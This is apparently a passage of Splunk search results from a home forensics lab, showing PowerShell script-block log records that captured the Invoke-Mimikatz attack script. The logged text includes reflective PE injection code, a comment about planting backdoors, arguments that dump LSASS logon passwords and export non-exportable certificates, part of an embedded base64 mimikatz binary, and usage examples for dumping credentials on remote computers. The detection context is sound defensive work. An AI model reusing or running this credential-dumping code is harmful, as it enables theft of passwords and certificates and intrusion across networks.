[IntPtr]::Zero))\n\t\t\t{\n\t\t\t\tThrow \"VoidFunc couldn't be found in the DLL\"\n\t\t\t}\n\t\t\t\n\t\t\t$VoidFuncAddr = Sub-SignedIntAsUnsigned $VoidFuncAddr $PEHandle\n\t\t\t$VoidFuncAddr = Add-SignedIntAsUnsigned $VoidFuncAddr $RemotePEHandle\n\t\t\t\n\t\t\t#Create the remote thread, don't wait for it to return.. This will probably mainly be used to plant backdoors\n\t\t\t$RThreadHandle = Invoke-CreateRemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $VoidFuncAddr -Win32Functions $Win32Functions\n\t\t}\n\t\t\n\t\t#Don't free a library if it is injected in a remote process\n\t\tif ($RemoteProcHandle -eq [IntPtr]::Zero)\n\t\t{\n\t\t\tInvoke-MemoryFreeLibrary -PEHandle $PEHandle\n\t\t}\n\t\telse\n\t\t{\n\t\t\t#Just delete the memory allocated in PowerShell to build the PE before injecting to remote process\n\t\t\t$Success = $Win32Functions.VirtualFree.Invoke($PEHandle, [UInt64]0, $Win32Constants.MEM_RELEASE)\n\t\t\tif ($Success -eq $false)\n\t\t\t{\n\t\t\t\tWrite-Warning \"Unable to call VirtualFree on the PE's memory. Continuing anyways.\" -WarningAction Continue\n\t\t\t}\n\t\t}\n\t\t\n\t\tWrite-Verbose \"Done!\"\n\t}\n\n\tMain\n}\n\n#Main function to either run the script locally or remotely\nFunction Main\n{\n\tif (($PSCmdlet.MyInvocation.BoundParameters[\"Debug\"] -ne $null) -and $PSCmdlet.MyInvocation.BoundParameters[\"Debug\"].IsPresent)\n\t{\n\t\t$DebugPreference  = \"Continue\"\n\t}\n\t\n\tWrite-Verbose \"PowerShell ProcessID: $PID\"\n\t\n\n\tif ($PsCmdlet.ParameterSetName -ieq \"DumpCreds\")\n\t{\n\t\t$ExeArgs = \"sekurlsa::logonpasswords exit\"\n\t}\n    elseif ($PsCmdlet.ParameterSetName -ieq \"DumpCerts\")\n    {\n        $ExeArgs = \"crypto::cng crypto::capi `\"crypto::certificates /export`\" `\"crypto::certificates /export /systemstore:CERT_SYSTEM_STORE_LOCAL_MACHINE`\" exit\"\n    }\n    else\n    {\n        $ExeArgs = $Command\n    }\n\n    [System.IO.Directory]::SetCurrentDirectory($pwd)\n\n    # mimikatz 2.2.0 (x64) #18362\n    # SHA256 hash: E4B762ECA32A797E305C9949504B95C4CDCF68FC8EEE0B3C101842488AF27D4F\n    # VirusTotal Analysis: no signature yet ;)\n    $PEBytes64 = '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\n79490727-fa2f-46e6-bf60-bef62708dfb5","_time":"2025-11-23T14:38:46.646+0000","category":"Execute","dvc":"DESKTOP-78CU07R","dvc_nt_host":"DESKTOP-78CU07R","event_id":"117","eventtype":["endpoint_services_processes","windows_event_signature","windows_ta_data"],"host":"DESKTOP-78CU07R","id":"117","index":"mydfir-project","linecount":"186","punct":"//_::._=--/===-==-------==--====___=__=________.__","severity":"medium","severity_id":"3","signature_id":"4104","source":"Microsoft-Windows-PowerShell/Operational","sourcetype":"WinEventLog","splunk_server":"chalitha-splunk","tag":"track_event_signatures","tag::eventtype":"track_event_signatures","vendor_product":"Microsoft Windows"}}
{"preview":false,"result":{"AssemblyBuilder":"$Domain.DefineDynamicAssembly($DynamicAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)","Attributes":"'AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInit'","ComputerName":"DESKTOP-78CU07R","ConstructorInfo":"[System.Runtime.InteropServices.MarshalAsAttribute]","DefaultParameterSetName":"DumpCreds","DllCharacteristicsType":"$TypeBuilder.CreateType()","Domain":"[AppDomain]","DynamicAssembly":"New-Object","EventCode":"4104","EventType":"3","IMAGE_DATA_DIRECTORY":"$TypeBuilder.CreateType()","IMAGE_FILE_HEADER":"$TypeBuilder.CreateType()","Keywords":"None","LogName":"Microsoft-Windows-PowerShell/Operational","MachineType":"$TypeBuilder.CreateType()","MagicType":"$TypeBuilder.CreateType()","Mandatory":"$true","Message":"Splunk","ModuleBuilder":"$AssemblyBuilder.DefineDynamicModule('DynamicModule', $false)","OpCode":"On","ParameterSetName":"DumpCreds","Position":"0","RecordNumber":"108","RemoteScriptBlock":"{","Sid":"S-1-5-21-1697325460-2044954953-441488130-1001","SidType":"0","SourceName":"Microsoft-Windows-PowerShell","SubSystemType":"$TypeBuilder.CreateType()","TaskCategory":"Execute","Type":"Warning","TypeBuilder":"$ModuleBuilder.DefineEnum('MachineType', 'Public', [UInt16])","User":"NOT_TRANSLATED","Win32Types":"New-Object","_raw":"11/23/2025 08:38:46.645 AM\nLogName=Microsoft-Windows-PowerShell/Operational\nEventCode=4104\nEventType=3\nComputerName=DESKTOP-78CU07R\nUser=NOT_TRANSLATED\nSid=S-1-5-21-1697325460-2044954953-441488130-1001\nSidType=0\nSourceName=Microsoft-Windows-PowerShell\nType=Warning\nRecordNumber=108\nKeywords=None\nTaskCategory=Execute a Remote Command\nOpCode=On create calls\nMessage=Splunk could not get the description for this event. Either the component that raises this event is not installed on your local computer or the installation is corrupt.\n\nFormatMessage error:\n\nGot the following information from this event: \n\nfunction Invoke-Mimikatz\n{\n<#\n.SYNOPSIS\n\nThis script leverages Mimikatz 2.0 and Invoke-ReflectivePEInjection to reflectively load Mimikatz completely in memory. This allows you to do things such as\ndump credentials without ever writing the mimikatz binary to disk. \nThe script has a ComputerName parameter which allows it to be executed against multiple computers.\n\nThis script should be able to dump credentials from any version of Windows through Windows 8.1 that has PowerShell v2 or higher installed.\n\nFunction: Invoke-Mimikatz\nAuthor: Joe Bialek, Twitter: @JosephBialek\nMimikatz Author: Benjamin DELPY `gentilkiwi`. Blog: http://blog.gentilkiwi.com. Email: benjamin@gentilkiwi.com. Twitter @gentilkiwi\nLicense:  http://creativecommons.org/licenses/by/3.0/fr/\nRequired Dependencies: Mimikatz (included)\nOptional Dependencies: None\nMimikatz version: 2.0 alpha (12/14/2015)\n\n.DESCRIPTION\n\nReflectively loads Mimikatz 2.0 in memory using PowerShell. Can be used to dump credentials without writing anything to disk. Can be used for any \nfunctionality provided with Mimikatz.\n\n.PARAMETER DumpCreds\n\nSwitch: Use mimikatz to dump credentials out of LSASS.\n\n.PARAMETER DumpCerts\n\nSwitch: Use mimikatz to export all private certificates (even if they are marked non-exportable).\n\n.PARAMETER Command\n\nSupply mimikatz a custom command line. This works exactly the same as running the mimikatz executable like this: mimikatz \"privilege::debug exit\" as an example.\n\n.PARAMETER ComputerName\n\nOptional, an array of computernames to run the script on.\n\t\n.EXAMPLE\n\nExecute mimikatz on the local computer to dump certificates.\nInvoke-Mimikatz -DumpCerts\n\n.EXAMPLE\n\nExecute mimikatz on two remote computers to dump credentials.\nInvoke-Mimikatz -DumpCreds -ComputerName @(\"computer1\", \"computer2\")\n\n.EXAMPLE\n\nExecute mimikatz on a remote computer with the custom command \"privilege::debug exit\" which simply requests debug privilege and exits\nInvoke-Mimikatz -Command \"privilege::debug exit\" -ComputerName \"computer1\"\n\n.NOTES\nThis script was created by combining the Invoke-ReflectivePEInjection script written by Joe Bialek and the Mimikatz code written by Benjamin DELPY\nFind Invoke-ReflectivePEInjection at: https://github.com/clymb3r/PowerShell/tree/master/Invoke-ReflectivePEInjection\nFind mimikatz at: http://blog.gentilkiwi.com\n\n.LINK\n\nhttp://clymb3r.wordpress.com/2013/04/09/modifying-mimikatz-to-be-loaded-using-invoke-reflectivedllinjection-ps1/\n#>\n\n[CmdletBinding(DefaultParameterSetName=\"DumpCreds\")]\nParam(\n\t[Parameter(Position = 0)]\n\t[String[]]\n\t$ComputerName,\n\n    [Parameter(ParameterSetName = \"DumpCreds\", Position = 1)]\n    [Switch]\n    $DumpCreds,\n\n    [Parameter(ParameterSetName = \"DumpCerts\", Position = 1)]\n    [Switch]\n    $DumpCerts,\n\n    [Parameter(ParameterSetName = \"CustomCommand\", Position = 1)]\n    [String]\n    $Command\n)\n\nSet-StrictMode -Version 2\n\n\n$RemoteScriptBlock = {\n\t[CmdletBinding()]\n\tParam(\n\t\t[Parameter(Position = 0, Mandatory = $true)]\n\t\t[String]\n\t\t$PEBytes64,\n\n        [Parameter(Position = 1, Mandatory = $true)]\n\t\t[String]\n\t\t$PEBytes32,\n\t\t\n\t\t[Parameter(Position = 2, Mandatory = $false)]\n\t\t[String]\n\t\t$FuncReturnType,\n\t\t\t\t\n\t\t[Parameter(Position = 3, Mandatory = $false)]\n\t\t[Int32]\n\t\t$ProcId,\n\t\t\n\t\t[Parameter(Position = 4, Mandatory = $false)]\n\t\t[String]\n\t\t$ProcName,\n\n        [Parameter(Position = 5, Mandatory = $false)]\n        [String]\n        $ExeArgs\n\t)\n\t\n\t###################################\n\t##########  Win32 Stuff  ##########\n\t###################################\n\tFunction Get-Win32Types\n\t{\n\t\t$Win32Types = New-Object System.Object\n\n\t\t#Define all the structures/enums that will be used\n\t\t#\tThis article shows you how to do this with reflection: http://www.exploit-monday.com/2012/07/structs-and-enums-using-reflection.html\n\t\t$Domain = [AppDomain]::CurrentDomain\n\t\t$DynamicAssembly = New-Object System.Reflection.AssemblyName('DynamicAssembly')\n\t\t$AssemblyBuilder = $Domain.DefineDynamicAssembly($DynamicAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)\n\t\t$ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('DynamicModule', $false)\n\t\t$ConstructorInfo = [System.Runtime.InteropServices.MarshalAsAttribute].GetConstructors()[0]\n\n\n\t\t############    ENUM    ############\n\t\t#Enum MachineType\n\t\t$TypeBuilder = $ModuleBuilder.DefineEnum('MachineType', 'Public', [UInt16])\n\t\t$TypeBuilder.DefineLiteral('Native', [UInt16] 0) | Out-Null\n\t\t$TypeBuilder.DefineLiteral('I386', [UInt16] 0x014c) | Out-Null\n\t\t$TypeBuilder.DefineLiteral('Itanium', [UInt16] 0x0200) | Out-Null\n\t\t$TypeBuilder.DefineLiteral('x64', [UInt16] 0x8664) | Out-Null\n\t\t$MachineType = $TypeBuilder.CreateType()\n\t\t$Win32Types | Add-Member -MemberType NoteProperty -Name MachineType -Value $MachineType\n\n\t\t#Enum MagicType\n\t\t$TypeBuilder = $ModuleBuilder.DefineEnum('MagicType', 'Public', [UInt16])\n\t\t$TypeBuilder.DefineLiteral('IMAGE_NT_OPTIONAL_HDR32_MAGIC', [UInt16] 0x10b) | Out-Null\n\t\t$TypeBuilder.DefineLiteral('IMAGE_NT_OPTIONAL_HDR64_MAGIC', [UInt16] 0x20b) | Out-Null\n\t\t$MagicType = $TypeBuilder.CreateType()\n\t\t$Win32Types | Add-Member -MemberType NoteProperty -Name MagicType -Value $MagicType\n\n\t\t#Enum SubSystemType\n\t\t$TypeBuilder = $ModuleBuilder.DefineEnum('SubSystemType', 'Public', [UInt16])\n\t\t$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_UNKNOWN', [UInt16] 0) | Out-Null\n\t\t$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_NATIVE', [UInt16] 1) | Out-Null\n\t\t$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_WINDOWS_GUI', [UInt16] 2) | Out-Null\n\t\t$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_WINDOWS_CUI', [UInt16] 3) | Out-Null\n\t\t$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_POSIX_CUI', [UInt16] 7) | Out-Null\n\t\t$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_WINDOWS_CE_GUI', [UInt16] 9) | Out-Null\n\t\t$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_EFI_APPLICATION', [UInt16] 10) | Out-Null\n\t\t$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_EFI_BOOT_SERVICE_DRIVER', [UInt16] 11) | Out-Null\n\t\t$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_EFI_RUNTIME_DRIVER', [UInt16] 12) | Out-Null\n\t\t$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_EFI_ROM', [UInt16] 13) | Out-Null\n\t\t$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_XBOX', [UInt16] 14) | Out-Null\n\t\t$SubSystemType = $TypeBuilder.CreateType()\n\t\t$Win32Types | Add-Member -MemberType NoteProperty -Name SubSystemType -Value $SubSystemType\n\n\t\t#Enum DllCharacteristicsType\n\t\t$TypeBuilder = $ModuleBuilder.DefineEnum('DllCharacteristicsType', 'Public', [UInt16])\n\t\t$TypeBuilder.DefineLiteral('RES_0', [UInt16] 0x0001) | Out-Null\n\t\t$TypeBuilder.DefineLiteral('RES_1', [UInt16] 0x0002) | Out-Null\n\t\t$TypeBuilder.DefineLiteral('RES_2', [UInt16] 0x0004) | Out-Null\n\t\t$TypeBuilder.DefineLiteral('RES_3', [UInt16] 0x0008) | Out-Null\n\t\t$TypeBuilder.DefineLiteral('IMAGE_DLL_CHARACTERISTICS_DYNAMIC_BASE', [UInt16] 0x0040) | Out-Null\n\t\t$TypeBuilder.DefineLiteral('IMAGE_DLL_CHARACTERISTICS_FORCE_INTEGRITY', [UInt16] 0x0080) | Out-Null\n\t\t$TypeBuilder.DefineLiteral('IMAGE_DLL_CHARACTERISTICS_NX_COMPAT', [UInt16] 0x0100) | Out-Null\n\t\t$TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_NO_ISOLATION', [UInt16] 0x0200) | Out-Null\n\t\t$TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_NO_SEH', [UInt16] 0x0400) | Out-Null\n\t\t$TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_NO_BIND', [UInt16] 0x0800) | Out-Null\n\t\t$TypeBuilder.DefineLiteral('RES_4', [UInt16] 0x1000) | Out-Null\n\t\t$TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_WDM_DRIVER', [UInt16] 0x2000) | Out-Null\n\t\t$TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_TERMINAL_SERVER_AWARE', [UInt16] 0x8000) | Out-Null\n\t\t$DllCharacteristicsType = $TypeBuilder.CreateType()\n\t\t$Win32Types | Add-Member -MemberType NoteProperty -Name DllCharacteristicsType -Value $DllCharacteristicsType\n\n\t\t###########    STRUCT    ###########\n\t\t#Struct IMAGE_DATA_DIRECTORY\n\t\t$Attributes = 'AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInit'\n\t\t$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_DATA_DIRECTORY', $Attributes, [System.ValueType], 8)\n\t\t($TypeBuilder.DefineField('VirtualAddress', [UInt32], 'Public')).SetOffset(0) | Out-Null\n\t\t($TypeBuilder.DefineField('Size', [UInt32], 'Public')).SetOffset(4) | Out-Null\n\t\t$IMAGE_DATA_DIRECTORY = $TypeBuilder.CreateType()\n\t\t$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_DATA_DIRECTORY -Value $IMAGE_DATA_DIRECTORY\n\n\t\t#Struct IMAGE_FILE_HEADER\n\t\t$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'\n\t\t$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_FILE_HEADER', $Attributes, [System.ValueType], 20)\n\t\t$TypeBuilder.DefineField('Machine', [UInt16], 'Public') | Out-Null\n\t\t$TypeBuilder.DefineField('NumberOfSections', 